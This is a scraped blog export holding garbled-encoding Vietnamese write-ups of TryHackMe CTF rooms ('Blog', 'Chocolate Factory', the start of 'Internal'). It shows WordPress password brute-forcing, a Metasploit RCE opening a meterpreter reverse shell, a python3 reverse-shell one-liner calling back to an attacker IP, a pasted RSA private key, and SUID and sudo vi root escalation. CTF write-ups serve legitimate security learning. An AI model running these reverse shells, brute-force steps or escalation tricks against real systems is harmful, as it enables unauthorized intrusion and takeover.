for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:06 \u0026lt;===============================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:06 [i] User(s) Identified: [+] kwheel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] bjoel | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blog.thm/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Karen Wheeler | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [+] Billy Joel | Found By: Rss Generator (Passive Detection) | Confirmed By: Rss Generator (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register TÃ´i cÃ³ 2 username lÃ  Kwheel vÃ  bjoel. Thá»­ brute force vá»›i 2 user nÃ y.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wpscan --url blog.thm --usernames kwheel bjoel --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt Trong khi chá» thÃ¬ tÃ´i thá»­ tÃ¬m exploit vá» Wordpress phiÃªn báº£n 5.0 xem cÃ³ tÃ¬m Ä‘Æ°á»£c RCE hay khÃ´ng, nhÆ°ng cÃ¡c exploit nÃ y Ä‘á»u yÃªu cáº§u pháº£i cÃ³ username vÃ  password \u0026#x1f645;\n[+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - kwheel / cutiepie1 Trying kwheel / randall Time: 00:05:42 \u0026lt;==== \u0026gt; (2865 / 62051) 4.61% ETA: ??:??:?? [!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1 Khi login vÃ o Wordpress, tÃ´i cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘á»ƒ khai thÃ¡c do Ä‘Ã¢y chá»‰ lÃ  user thÆ°á»ng. Tuy nhiÃªn bÃ¢y giá» Ä‘Ã£ cÃ³ user-pass nÃªn tÃ´i sáº½ quay láº¡i cÃ¡c exploit Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c bÃªn trÃªn.\nTÃ´i cÃ³ 1 RCE exploit trong Metasploit\nmsf6 \u0026gt; search wordpress 5.0 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/wp_crop_rce 2019-02-19 excellent Yes WordPress Crop-image Shell Upload 1 exploit/unix/webapp/wp_property_upload_exec 2012-03-26 excellent Yes WordPress WP-Property PHP File Upload Vulnerability 2 auxiliary/scanner/http/wp_registrationmagic_sqli 2022-01-23 normal Yes Wordpress RegistrationMagic task_ids Authenticated SQLi Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/wp_registrationmagic_sqli msf6 \u0026gt; Thá»­ vá»›i exploit Ä‘áº§u tiÃªn\nmsf6 exploit(multi/http/wp_crop_rce) \u0026gt; show options Module options (exploit/multi/http/wp_crop_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The WordPress password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the wordpress application USERNAME yes The WordPress username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 WordPress Thay Ä‘á»•i cÃ¡c giÃ¡ trá»‹ trÃ¹ng vá»›i target:\nPASSWORD vÃ  USERNAME: user-pass vá»«a tÃ¬m Ä‘Æ°á»£c RHOSTS: IP mÃ¡y má»¥c tiÃªu RPORT: port cá»§a mÃ¡y má»¥c tiÃªu TARGETURI: path dáº«n Ä‘áº¿n wordpress, nhÆ° trong bÃ i nÃ y thÃ¬ blog nÃ³ Ä‘Ã£ lÃ  wordpress luÃ´n rá»“i. Tuy nhiÃªn trong vÃ i trÆ°á»ng há»£p thÃ¬ nÃ³ sáº½ cÃ³ path lÃ  /wordpress/ LHOST vÃ  LPORT: IP mÃ¡y cá»§a tÃ´i vÃ  port mÃ  tÃ´i muá»‘n táº¡o listener. VÃ  sau khi Ä‘Ã£ thiáº¿t láº­p Ä‘áº§y Ä‘á»§ thÃ¬ run thÃ´i\nmsf6 exploit(multi/http/wp_crop_rce) \u0026gt; run [*] Started reverse TCP handler on 10.18.3.74:4444 [*] Authenticating with WordPress using kwheel:cutiepie1... [+] Authenticated with WordPress [*] Preparing payload... [*] Uploading payload [+] Image uploaded [*] Including into theme [*] Sending stage (39927 bytes) to 10.10.24.181 [*] Attempting to clean up files... [*] Meterpreter session 2 opened (10.18.3.74:4444 -\u0026gt; 10.10.24.181:54304) at 2022-08-15 23:17:55 -0400 meterpreter \u0026gt; shell Process 1476 created. Channel 1 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) Trong /home directory tÃ´i cÃ³ user bjoel, tuy nhiÃªn user.txt trong Ä‘Ã¢y chá»‰ lÃ  1 cÃº lá»«a \u0026#x1f4a9;\nwww-data@blog:/home/bjoel$ cat user.txt cat user.txt You won\u0026#39;t find what you\u0026#39;re looking for here. TRY HARDER www-data@blog:/home/bjoel$ Cháº¯c cháº¯n lÃ  khÃ´ng cÃ³ password Ä‘á»ƒ sá»­ dá»¥ng sudo -l nÃªn tÃ´i sáº½ thá»­ tÃ¬m file vá»›i user root vÃ  quyá»n cháº¡y vá»›i root\nwww-data@blog:/$ find / -type f -user root -perm -u=s 2\u0026gt;/dev/null /usr/bin/passwd /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/chsh /usr/bin/newuidmap /usr/bin/pkexec /usr/bin/chfn /usr/bin/sudo /usr/bin/newgidmap /usr/bin/traceroute6.iputils /usr/sbin/checker /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device ... www-data@blog:/$ file /usr/sbin/checker /usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped TÃ´i tháº¥y á»Ÿ Ä‘Ã¢y cÃ³ 1 file tÃªn checker khÃ¡ láº¡, nhÃ¬n qua thÃ¬ nÃ³ lÃ  1 file binary. Thá»­ phÃ¢n tÃ­ch nÃ³ xem sao\nwww-data@blog:/$ strings /usr/sbin/checker /lib64/ld-linux-x86-64.so.2 libc.so.6 setuid puts getenv system __cxa_finalize __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable =9 AWAVI AUATL []A\\A]A^A_ admin /bin/bash Not an Admin ;*3$\u0026#34; GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.7698 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry checker.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini getenv@@GLIBC_2.2.5 _ITM_deregisterTMCloneTable puts@@GLIBC_2.2.5 _edata system@@GLIBC_2.2.5 __libc_start_main@@GLIBC_2.2.5 __data_start __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __TMC_END__ _ITM_registerTMCloneTable setuid@@GLIBC_2.2.5 __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment www-data@blog:/$ ./usr/sbin/checker Not an Admin Khi cháº¡y file nÃ y náº¿u khÃ´ng pháº£i admin thÃ¬ nÃ³ sáº½ in ra \u0026ldquo;Not an Admin\u0026rdquo;. TÃ´i cÃ³ nhÃ¬n tháº¥y phÃ­a trÃªn cÃ³ getenv hiá»ƒu Ä‘Æ¡n giáº£n lÃ  nÃ³ sáº½ trá» Ä‘áº¿n mÃ´i trÆ°á»ng cÃ³ tham sá»‘ \u0026ldquo;admin\u0026rdquo;. TÃ´i pháº£i táº¡o má»™t mÃ´i trÆ°á»ng má»›i tÃªn \u0026ldquo;admin\u0026rdquo; Ä‘á»ƒ khi cháº¡y file binary nÃ y nÃ³ sáº½ trá» Ä‘áº¿n mÃ´i trÆ°á»ng \u0026ldquo;admin\u0026rdquo;\nwww-data@blog:/$ export admin=9\nSau Ä‘Ã³ cháº¡y láº¡i file checker\nwww-data@blog:/$ /usr/sbin/checker root@blog:/# root@blog:/# whoami root root@blog:/# LÃªn luÃ´n root user nÃ y??\nroot@blog:/# find / -type f -name user.txt 2\u0026gt;/dev/null /home/bjoel/user.txt /media/usb/user.txt root@blog:/# Conclusion # Qua bÃ i nÃ y, tÃ´i há»c Ä‘Æ°á»£c thÃªm vá» file binary, cÃ¡ch biÃªn dá»‹ch nÃ³ hay chá»‰ Ä‘Æ¡n giáº£n lÃ  Ä‘á»c nÃ³ á»Ÿ dáº¡ng \u0026ldquo;cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c\u0026rdquo; \u0026#x1f604;\nTÃ´i nghÄ© bÃ i nÃ y Ä‘Æ°á»£c xáº¿p vÃ o má»©c Ä‘á»™ Medium lÃ  vÃ¬ pháº§n leo thang Ä‘áº·c quyá»n vá»›i file binary vÃ  cÃ¡ch táº¡o mÃ´i trÆ°á»ng áº£o Ä‘á»ƒ file cÃ³ thá»ƒ biÃªn dá»‹ch.\nÄá»c thÃªm: Linux Environment Variable\n","date":"18 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/blog/","section":"Ctf","summary":"","title":"Tryhackme - Blog","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Chocolate Factory\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ.\ná» Ä‘Ã¢y tÃ´i cÃ³ 3 port Ä‘Ã¡ng chÃº Ã½ lÃ \nftp vá»›i port 21 vÃ  cÃ³ thá»ƒ login vá»›i anonymous ssh vá»›i port 22 http vá»›i port 80 CÃ¹ng xem qua port 21 ftp xem cÃ³ gÃ¬ khÃ´ng\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ftp 10.10.125.215 Connected to 10.10.125.215. 220 (vsFTPd 3.0.3) Name (10.10.125.215:neo): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||7508|) 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg 226 Directory send OK. Láº¥y file áº£nh nÃ y vá», sau Ä‘Ã³ sá»­ dá»¥ng steghide Ä‘á»ƒ xem cÃ³ file nÃ o áº©n trong áº£nh nÃ y khÃ´ng. TÃ´i cÅ©ng khÃ´ng cháº¯c láº¯m vÃ¬ khÃ´ng cÃ³ passphrase, nhÆ°ng khÃ´ng cáº§n passphrase tÃ´i váº«n cÃ³ 1 file txt á»Ÿ Ä‘Ã¢y.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ steghide extract -sf gum_room.jpg Enter passphrase: wrote extracted data to \u0026#34;b64.txt\u0026#34;. Trong file nÃ y cÃ³ 1 Ä‘oáº¡n code base64 khÃ¡ dÃ i. Khi giáº£ mÃ£ nÃ³ ra tÃ´i sáº½ cÃ³ password cá»§a user charlie\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat b64.txt | base64 -d daemon:*:18380:0:99999:7::: bin:*:18380:0:99999:7::: sys:*:18380:0:99999:7::: sync:*:18380:0:99999:7::: games:*:18380:0:99999:7::: man:*:18380:0:99999:7::: lp:*:18380:0:99999:7::: mail:*:18380:0:99999:7::: news:*:18380:0:99999:7::: uucp:*:18380:0:99999:7::: proxy:*:18380:0:99999:7::: www-data:*:18380:0:99999:7::: backup:*:18380:0:99999:7::: list:*:18380:0:99999:7::: irc:*:18380:0:99999:7::: gnats:*:18380:0:99999:7::: nobody:*:18380:0:99999:7::: systemd-timesync:*:18380:0:99999:7::: systemd-network:*:18380:0:99999:7::: systemd-resolve:*:18380:0:99999:7::: _apt:*:18380:0:99999:7::: mysql:!:18382:0:99999:7::: tss:*:18382:0:99999:7::: shellinabox:*:18382:0:99999:7::: strongswan:*:18382:0:99999:7::: ntp:*:18382:0:99999:7::: messagebus:*:18382:0:99999:7::: arpwatch:!:18382:0:99999:7::: Debian-exim:!:18382:0:99999:7::: uuidd:*:18382:0:99999:7::: debian-tor:*:18382:0:99999:7::: redsocks:!:18382:0:99999:7::: freerad:*:18382:0:99999:7::: iodine:*:18382:0:99999:7::: tcpdump:*:18382:0:99999:7::: miredo:*:18382:0:99999:7::: dnsmasq:*:18382:0:99999:7::: redis:*:18382:0:99999:7::: usbmux:*:18382:0:99999:7::: rtkit:*:18382:0:99999:7::: sshd:*:18382:0:99999:7::: postgres:*:18382:0:99999:7::: avahi:*:18382:0:99999:7::: stunnel4:!:18382:0:99999:7::: sslh:!:18382:0:99999:7::: nm-openvpn:*:18382:0:99999:7::: nm-openconnect:*:18382:0:99999:7::: pulse:*:18382:0:99999:7::: saned:*:18382:0:99999:7::: inetsim:*:18382:0:99999:7::: colord:*:18382:0:99999:7::: i2psvc:*:18382:0:99999:7::: dradis:*:18382:0:99999:7::: beef-xss:*:18382:0:99999:7::: geoclue:*:18382:0:99999:7::: lightdm:*:18382:0:99999:7::: king-phisher:*:18382:0:99999:7::: systemd-coredump:!!:18396:::::: _rpc:*:18451:0:99999:7::: statd:*:18451:0:99999:7::: _gvm:*:18496:0:99999:7::: charlie:$6$**********************************************************/:18535:0:99999:7::: TÃ´i Ä‘Ã£ thá»­ dÃ¹ng john Ä‘á»ƒ crack nhÆ°ng khÃ´ng thá»ƒ. Táº¡m thá»i Ä‘á»ƒ Ä‘Ã³ Ä‘Ã£. GhÃ© qua web nÃ o. Web lÃ  trang login, thá»­ qua vÃ  path cÅ©ng nhÆ° user-pass Ä‘Æ¡n giáº£n Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i sáº½ tÃ¬m web path vá»›i dirsearch\n[23:08:40] 200 - 569B - /home.php [23:08:43] 200 - 1KB - /index.html [23:08:43] 200 - 273B - /index.php.bak [23:09:19] 403 - 278B - /server-status [23:09:19] 403 - 278B - /server-status/ Thá»­ vÃ o /home.php vÃ  á»Ÿ Ä‘Ã¢y tÃ´i cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡c command Ä‘Æ¡n giáº£n Ä‘á»ƒ láº¥y thÃ´ng tin vá» server. Lá»£i dá»¥ng nÃ³ Ä‘á»ƒ láº¥y ná»™i dung file /etc/passwd Ä‘á»ƒ cÃ³ thá»ƒ crack láº¡i hash trÃªn báº±ng john\nÄáº§u tiÃªn tÃ´i táº¡o file shadow vá»›i passwd láº¥y Ä‘Æ°á»£c khi decode file b64.txt\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat shadow.txt charlie:$6$CZJnCPeQWp9/***************************************************************:18535:0:99999:7::: Sau Ä‘Ã³ sao chÃ©p passwd cá»§a charlie trong /etc/passwd\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat passwd charlie:x:1000:1000:localhost:/home/charley:/bin/bash Sá»­ dá»¥ng unshadow vÃ  john Ä‘á»ƒ xem cÃ³ crack Ä‘Æ°á»£c passwd cá»§a charlie khÃ´ng. Sau táº¥t cáº£ cá»‘ gáº¯ng thÃ¬ tÃ´i khÃ´ng thá»ƒ crack Ä‘Æ°á»£c cÃ¡i pass nÃ y, Ä‘Ã nh quay vá» web Ä‘á»ƒ khai thÃ¡c command site.\nSá»­ dá»¥ng BurpSuite Ä‘á»ƒ láº¥y request.\nCÃ³ 1 file tÃªn lÃ  key_rev_key, Ä‘Ã¢y lÃ  file binary. Sá»­ dá»¥ng command strings\nVáº­y lÃ  tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c key. Tiáº¿p theo tÃ´i Ä‘á»ƒ Ã½ á»Ÿ bÃªn trÃªn cÃ²n cÃ³ validate.php.\nTÃ´i tÃ¬m Ä‘Æ°á»£c pass cá»§a user charlie á»Ÿ Ä‘Ã¢y. BÃ¢y giá» thÃ¬ thá»­ cÃ¡c payload Ä‘á»ƒ láº¥y RCE. TrÆ°á»›c Ä‘Ã³ tÃ´i kiá»ƒm tra xem server cÃ³ python hay khÃ´ng\nTáº¡o listener: nc -lnvp 2402, sau Ä‘Ã³ táº¡o payload vá»›i python3 vÃ  dÃ¡n nÃ³ pháº§n command\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.18.3.74\u0026quot;,2402));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.184.210] 35746 To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. www-data@chocolate-factory:/var/www/html$ SSH # Trong thÆ° má»¥c /home cÃ³ charlie, trong nÃ y tÃ´i cÃ³ user_flag nhÆ°ng khÃ´ng thá»ƒ má»Ÿ Ä‘Æ°á»£c, táº¥t nhiÃªn rá»“i! NgoÃ i ra cÃ²n cÃ³ 2 file teleport, trong Ä‘Ã³ file teleport lÃ  file rsa private key, thá»­ láº¥y nÃ³ vá» vÃ  login ssh vá»›i rsa key nÃ y\nwww-data@chocolate-factory:/home/charlie$ cat teleport cat teleport -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9 zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2 EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19 znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln -----END RSA PRIVATE KEY----- â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh -i id_rsa charlie@10.10.184.210 ... ... charlie@chocolate-factory:/$ charlie@chocolate-factory:/$ id uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) charlie@chocolate-factory:/$ cd /home/charlie charlie@chocolate-factory:/home/charlie$ ls teleport teleport.pub user.txt charlie@chocolate-factory:/$ Privilege escalation # sudo -l\ncharlie@chocolate-factory:/home/charlie$ sudo -l Matching Defaults entries for charlie on chocolate-factory: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User charlie may run the following commands on chocolate-factory: (ALL : !root) NOPASSWD: /usr/bin/vi charlie@chocolate-factory:/home/charlie$ Thá»­ qua GTFOBins vÃ  tÃ´i tÃ¬m tháº¥y cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i vi\ncharlie@chocolate-factory:/home/charlie$ sudo vi -c \u0026#39;:!/bin/sh\u0026#39; /dev/null # id uid=0(root) gid=0(root) groups=0(root) # ls /root/ root.py # cat /root/root.py from cryptography.fernet import Fernet import pyfiglet key=input(\u0026#34;Enter the key: \u0026#34;) f=Fernet(key) encrypted_mess= \u0026#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ\u0026#39; dcrypt_mess=f.decrypt(encrypted_mess) mess=dcrypt_mess.decode() display1=pyfiglet.figlet_format(\u0026#34;You Are Now The Owner Of \u0026#34;) display2=pyfiglet.figlet_format(\u0026#34;Chocolate Factory \u0026#34;) print(display1) print(display2) print(mess) Khi cháº¡y file nÃ y thÃ¬ pháº£i nháº­p key. TÃ´i thá»­ nháº­p key Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c á»Ÿ pháº§n Ä‘áº§u vÃ  tÃ¬m Ä‘Æ°á»£c root flag\n# python /root/root.py Enter the key: b\u0026#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=\u0026#39; __ __ _ _ _ _____ _ \\ \\ / /__ _ _ / \\ _ __ ___ | \\ | | _____ __ |_ _| |__ ___ \\ V / _ \\| | | | / _ \\ | \u0026#39;__/ _ \\ | \\| |/ _ \\ \\ /\\ / / | | | \u0026#39;_ \\ / _ \\ | | (_) | |_| | / ___ \\| | | __/ | |\\ | (_) \\ V V / | | | | | | __/ |_|\\___/ \\__,_| /_/ \\_\\_| \\___| |_| \\_|\\___/ \\_/\\_/ |_| |_| |_|\\___| ___ ___ __ / _ \\__ ___ __ ___ _ __ / _ \\ / _| | | | \\ \\ /\\ / / \u0026#39;_ \\ / _ \\ \u0026#39;__| | | | | |_ | |_| |\\ V V /| | | | __/ | | |_| | _| \\___/ \\_/\\_/ |_| |_|\\___|_| \\___/|_| ____ _ _ _ / ___| |__ ___ ___ ___ | | __ _| |_ ___ | | | \u0026#39;_ \\ / _ \\ / __/ _ \\| |/ _` | __/ _ \\ | |___| | | | (_) | (_| (_) | | (_| | || __/ \\____|_| |_|\\___/ \\___\\___/|_|\\__,_|\\__\\___| _____ _ | ___|_ _ ___| |_ ___ _ __ _ _ | |_ / _` |/ __| __/ _ \\| \u0026#39;__| | | | | _| (_| | (__| || (_) | | | |_| | |_| \\__,_|\\___|\\__\\___/|_| \\__, | ","date":"10 December 2021","externalUrl":null,"permalink":"/ctf/tryhackme/chocolate-factory/","section":"Ctf","summary":"","title":"Tryhackme - Chocolat Factory","type":"ctf"},{"content":"","date":"5 December 2021","externalUrl":null,"permalink":"/tags/jenkins/","section":"Tags","summary":"","title":"Jenkins","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Internal\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng thÃ´i, viá»‡c Ä‘áº§u tiÃªn lÃ  quÃ©t cÃ¡c cá»•ng dá»‹ch vá»¥ Ä‘ang má»Ÿ.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5 | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw= | 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Thá»­ check qua trang web, vÃ¬ nÃ³ chá»‰ lÃ  1 trang máº·c Ä‘á»‹nh nÃªn sau khi thá»­ qua vÃ i path cÆ¡ báº£n thÃ¬ tÃ´i sáº½ tÃ¬m web path luÃ´n.\nVáº­y lÃ  trang nÃ y Ä‘Æ°á»£c build báº±ng Wordpress. Tuy nhiÃªn khi thá»­ vÃ o blog thÃ¬ nÃ³ hÆ¡i láº¡\nVáº­y nÃªn tÃ´i Ä‘Ã£ thÃªm ip vÃ  domain vÃ o file host Ä‘á»ƒ nÃ³ trá»Ÿ vá» trang php\nBÃ¢y giá» thÃ¬ thá»­ dÃ¹ng Wpscan xem cÃ³ tÃ¬m Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t á»Ÿ Ä‘Ã¢y khÃ´ng.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wpscan --url http://internal.thm/blog/ -e u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner 